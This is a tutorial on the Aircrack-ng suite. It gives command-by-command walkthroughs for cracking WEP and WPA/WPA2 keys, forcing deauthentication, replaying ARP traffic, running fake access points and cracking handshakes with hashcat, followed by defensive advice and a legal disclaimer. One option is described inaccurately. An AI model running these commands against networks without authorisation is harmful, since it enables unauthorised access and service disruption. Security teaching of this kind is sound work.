## Introduction to Aircrack-NG

Aircrack-NG is a comprehensive suite of tools for assessing WiFi network security. It focuses on different areas of WiFi security:

- Monitoring: Packet capture and export of data to text files for further processing
- Attacking: Replay attacks, deauthentication, fake access points, and others via packet injection
- Testing: Checking WiFi cards and driver capabilities
- Cracking: WEP and WPA PSK (WPA 1 and 2)

## Core Components

Aircrack-NG consists of multiple tools that work together to provide a complete WiFi security assessment platform. Here are the primary components:

### aircrack-ng

The core component that performs the actual key cracking after data capture. It implements standard FMS attacks along with optimizations like KoreK attacks, as well as the PTW attack, making the WEP key recovery much faster compared to other tools.

```bash
# Basic WEP cracking
aircrack-ng -b 00:11:22:33:44:55 capture.cap

# WPA/WPA2 cracking with wordlist
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap
```

### airodump-ng

Used for packet capture, primarily for collecting WEP IVs (Initialization Vectors) to later use with aircrack-ng. It's also used to locate WiFi networks in your area and gather information about them.

```bash
# Monitor all channels
airodump-ng mon0

# Focus on specific AP
airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture mon0
```

### aireplay-ng

Used to generate traffic for later use in aircrack-ng. This tool implements various attacks such as:

- Deauthentication
- Fake authentication
- Interactive packet replay
- ARP request replay
- KoreK chopchop attack
- Fragmentation attack

```bash
# Deauthentication attack
aireplay-ng -0 5 -a 00:11:22:33:44:55 mon0

# ARP replay attack
aireplay-ng -3 -b 00:11:22:33:44:55 mon0
```

### airmon-ng

Script used to enable and disable monitor mode on wireless interfaces. It also can be used to kill processes that might interfere with the wireless card manipulation.

```bash
# Check interfaces
airmon-ng

# Start monitor mode
airmon-ng start wlan0

# Kill interfering processes
airmon-ng check kill
```

## Setting Up Your Environment

Before using Aircrack-NG, you need to ensure your wireless card supports monitor mode and packet injection. Here's how to set up your environment:

### System Requirements

- A compatible wireless adapter that supports monitor mode
- Linux-based operating system (Kali Linux recommended)
- Proper drivers for your wireless adapter

### Installation

On Debian/Ubuntu-based systems:

```bash
sudo apt update
sudo apt install aircrack-ng
```

On Arch Linux:

```bash
sudo pacman -S aircrack-ng
```

### Testing Your Wireless Card

```bash
sudo airmon-ng
sudo aireplay-ng --test wlan0
```

## Practical Demonstration: WEP Cracking

Let's walk through a basic WEP cracking process:

1. **Start monitor mode:**

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

2. **Discover networks:**

```bash
sudo airodump-ng wlan0mon
```

3. **Focus on target network:**

```bash
sudo airodump-ng -c [channel] --bssid [target_MAC] -w capture wlan0mon
```

4. **Perform fake authentication:**

```bash
sudo aireplay-ng -1 0 -a [target_MAC] -h [your_MAC] wlan0mon
```

5. **ARP replay attack to generate IVs:**

```bash
sudo aireplay-ng -3 -b [target_MAC] -h [your_MAC] wlan0mon
```

6. **Crack the WEP key:**

```bash
sudo aircrack-ng capture*.cap
```

## Advanced Techniques: WPA/WPA2 Cracking

WPA/WPA2 cracking is more challenging than WEP and requires capturing a 4-way handshake:

1. **Start monitoring:**

```bash
sudo airmon-ng start wlan0
sudo airodump-ng -c [channel] --bssid [target_MAC] -w wpa_capture wlan0mon
```

2. **Capture handshake** (either wait for a client to connect or force deauthentication):

```bash
sudo aireplay-ng -0 1 -a [target_MAC] -c [client_MAC] wlan0mon
```

3. **Crack password using dictionary:**

```bash
sudo aircrack-ng -w wordlist.txt wpa_capture*.cap
```

## Using Hashcat with Aircrack-NG

For more powerful password cracking, you can convert the captured handshake to a format usable by Hashcat:

```bash
# Convert cap file to hccapx format
cap2hccapx wpa_capture.cap wpa_capture.hccapx

# Use hashcat for cracking
hashcat -m 2500 wpa_capture.hccapx wordlist.txt
```

## Additional Tools in the Suite

The Aircrack-NG suite includes many other useful tools:

### airdecap-ng

Decrypts WEP/WPA/WPA2 capture files.

```bash
airdecap-ng -b 00:11:22:33:44:55 -k [WEP_KEY] capture.cap
```

### airbase-ng

Used to set up fake access points.

```bash
airbase-ng -e "FreeWiFi" -c 1 mon0
```

### airdecloak-ng

Removes WEP cloaking from capture files.

### airolib-ng

Manages and speeds up WPA/WPA2 cracking by pre-computing PMKs.

## Defensive Measures

Understanding these attack vectors helps network administrators implement better security:

1. **Avoid WEP entirely** - It's fundamentally broken
2. **Use strong WPA2/WPA3 passwords** - At least 12 characters with mixed case, numbers, and symbols
3. **Implement 802.1X authentication** where possible
4. **Enable WPA3 if available** on both access points and clients
5. **Monitor for deauthentication attacks**

## Ethical Considerations and Legal Disclaimer

::: {.callout-warning}
Aircrack-NG should only be used to audit networks you own or have explicit permission to test. Unauthorized access to networks is illegal in most jurisdictions.
:::

Proper usage scenarios include:

- Recovering a lost WiFi password for your own network
- Security auditing of your organization's wireless infrastructure
- Learning about wireless security in a controlled environment
- Penetration testing with proper authorization

## Advanced Configurations

For serious security professionals, consider these advanced configurations:

### Custom Dictionary Generation

```bash
# Using crunch to generate custom wordlist
crunch 8 12 0123456789ABCDEF -o custom_wep_keys.txt
```

### Optimizing Capture Settings

```bash
# Capture only authentication packets
airodump-ng --bssid [target_MAC] -c [channel] --output-format pcap --write capture -t OPN wlan0mon
```

## Conclusion

Aircrack-NG remains one of the most powerful and comprehensive wireless security assessment tools available. By understanding how these tools work, security professionals can better protect wireless networks from potential attacks.
